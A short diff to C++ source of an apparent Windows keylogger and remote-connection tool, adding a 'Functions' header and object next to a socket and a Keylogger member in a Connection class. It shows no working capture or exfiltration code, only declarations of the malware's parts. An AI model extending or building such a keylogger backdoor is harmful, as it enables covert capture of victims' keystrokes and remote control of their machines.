@@ -17,6 +17,7 @@
 #include <fstream>
 #include <WS2tcpip.h>
 #include "Keylogger.h"
+#include "Functions.h"
 #include <windows.h>
 #include<algorithm>
 #include <tchar.h>
@@ -45,6 +46,7 @@ class Connection {
     int port;
     SOCKET sock;
     Keylogger *keylogger = new Keylogger();
+    Functions *functions = new Functions();
 
 public:
     //Initialize ip and string
